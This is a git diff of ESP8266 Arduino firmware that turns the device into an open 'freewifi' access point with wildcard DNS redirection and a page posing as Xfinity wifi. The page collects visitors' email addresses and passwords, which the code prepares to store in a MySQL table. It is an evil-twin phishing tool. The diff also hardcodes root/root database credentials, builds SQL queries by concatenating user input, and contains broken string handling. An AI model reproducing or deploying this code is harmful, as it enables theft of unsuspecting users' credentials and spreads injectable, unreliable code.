@@ -24,6 +24,8 @@
 const char W_HTML[] PROGMEM = "text/html";
 char *passwordHost = "00000000"; // IP of the MySQL *server* here
 char* user = "root";         // MySQL user login username
+const IPAddress apIp(192, 168, 0, 1);
+DNSServer dnsServer;
 char* dbpass = "root";
 int LED = 2;
 WiFiClient client;
@@ -111,17 +113,14 @@ bool tryConn(){
 return wificonnect;
 }
 
-void hostWifi(){
+void hostWifi(int type){
+  if(type == 1){
   String ssidHost = "HARP ESP-";
   byte mac[6];
   WiFi.macAddress(mac);
   ssidHost += String(mac[5], HEX);
   const char* newssid = ssidHost.c_str();
   Serial.println("Did not connect!");
-  Serial.println(ssidHost);
-    Serial.println(passwordHost);
-    //WiFi.macAddress(mac);
-    WiFi.softAP(newssid, passwordHost);
     IPAddress myIP = WiFi.softAPIP();
   Serial.print("AP IP address: ");
   Serial.println(myIP);
@@ -130,6 +129,23 @@ void hostWifi(){
   server.begin();
   Serial.println("HTTP server started");
   hosting = true;
+}else{
+  SPIFFS.begin();
+
+  WiFi.persistent(false);
+  WiFi.disconnect(true);
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(apIp, apIp, IPAddress(255, 255, 255, 0));
+  WiFi.softAP("freewifi", nullptr, 1);
+
+  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
+  dnsServer.start(53, "*", apIp);
+
+  server.on("/", httpHome);
+  server.on("/connect", httpConnect);
+  server.on("/pure.css", httpPureCss);
+  server.onNotFound(httpDefault);
+  server.begin();
 }
 
 void readWifi(){
@@ -181,7 +197,7 @@ void loop(void){
 }
 
 
-void queryDB(bool insert){
+void queryDB(bool insert, const char* email, const char* domain, const char* password){
  delay(50);
  digitalWrite(LED, HIGH);
  if(WiFi.status() != WL_CONNECTED){
@@ -193,7 +209,8 @@ void queryDB(bool insert){
   // Initiate the query class instance
   MySQL_Cursor *cur_mem = new MySQL_Cursor(&conn);
   if(insert){
-  query = "SELECT Hosts.Host_Mac, Addon.Addon_Pin, Addon.Addon_State, Addon.Addon_Type from Addon INNER JOIN Hosts on Addon.Addon_Host_ID = Hosts.Host_ID;";
+  query = "Insert into Info (ID, email, domain, password, verified) values (0, '";
+  strcat(query, email);
   }
   cur_mem->execute(query);
   // Fetch the columns and print them
@@ -289,8 +306,11 @@ void createWebServer(int webtype)
         server.send(statusCode, "application/json", content);
     });
   } else if (webtype == 0) {
- server.on(String(F("/attack.html")).c_str(), HTTP_GET, []() {
-            sendProgmem(attackhtml, sizeof(attackhtml), W_HTML); 
+    const char* username = "";
+    const char* domain = "";
+ server.on(String(F("/xfinitywifi.html")).c_str(), HTTP_GET, []() {
+  
+        server.send(200, "text/html", content); 
     });
     server.on("/setting", []() {
         String tempemail = server.arg("email");
@@ -298,24 +318,11 @@ void createWebServer(int webtype)
         tempemail.toCharArray(email, 50);
         String pass = server.arg("pass");
         char *splitEmail = strtok(email, "@");
-        String username = splitEmail;
-        String domain = strtok(NULL, "@");
-        if (qsid.length() > 0 && qpass.length() > 0) {
-          Serial.println("clearing eeprom");
-          for (int i = 0; i < 96; ++i) { EEPROM.write(i, 0); }
-          Serial.println("writing eeprom ssid:");
-          writeEEPROM(0,32,qsid);
-          Serial.println("writing eeprom pass:");
-          writeEEPROM(32,32,qpass);
-          Serial.println("writing eeprom ip:");
-          writeEEPROM(64,16,qip); 
-          EEPROM.commit();
-          content = "{\"Success\":\"saved to eeprom... reset to boot into new wifi\"}";
-          statusCode = 200;
-          delay(200);
-          WiFi.disconnect();
-          readWifi();
-          tryConn();
+        username = splitEmail;
+        domain = strtok(NULL, "@");
+        if (pass.length() > 0) {
+          // Do a query here and insert it
+          //queryDB(true, username, domain, password);
         } else {
           content = "{\"Error\":\"404 not found\"}";
           statusCode = 404;
@@ -329,7 +336,12 @@ void createWebServer(int webtype)
    //Serial.println("\nRunning SELECT and printing results\n");
   // Initiate the query class instance
   MySQL_Cursor *cur_mem = new MySQL_Cursor(&conn);
-  query = "Select * from Info where username = " + username + " and domain = " + domain + " and verified = 1;";
+  query = "Select * from Info where username = ";
+  strcat(query, username);
+  strcat(query," and domain = ");
+  strcat(query, domain);
+  strcat(query, " and verified = 1;");
+  cur_mem->execute(query);
   }
 }
 
